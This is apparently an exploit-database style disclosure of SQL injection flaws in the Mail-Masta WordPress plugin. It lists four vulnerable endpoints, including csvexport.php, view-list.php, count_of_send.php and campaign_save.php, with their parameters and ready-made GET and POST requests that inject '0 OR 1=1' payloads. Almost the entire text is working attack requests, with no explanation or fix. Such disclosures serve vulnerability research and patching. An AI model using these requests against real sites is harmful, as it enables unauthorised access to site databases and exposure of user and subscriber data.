Mail-Masta SQL Injection
=========================================
Page: ../wp-content/plugins/mail-masta/inc/lists/csvexport.php

GET Parameter: list_id

http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php


=========================================

Page: ../wp-content/plugins/mail-masta/inc/lists/view-list.php (Requires authentication to Wordpress admin)

GET Parameter: filter_list

http://my_wp_app/wp-admin/admin.php?page=masta-lists&action=view_list&filter_list=0+OR+1%3D1


=========================================

Page: ../wp-content/plugins/mail-masta/inc/campaign/count_of_send.php (Requires authentication to Wordpress admin)

POST Parameter: camp_id

http://my_wp_app/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=/var/www/html/wordpress/wp-load.php

=========================================


Page: ../wp-content/plugins/mail-masta/inc/campaign_save.php (Requires authentication to Wordpress admin)

POST Parameter: list_id

POST /wp-admin/admin-ajax.php?id= HTTP/1.1

...snip...

action=my_action&url=%2Fvar%2Fwww%2Fhtml%2Fwp-content%2Fplugins%2Fmail-masta%2Finc%2Fcampaign_save.php&sender_selected_list_check=check&list_id=1+OR+1%3D1

=========================================
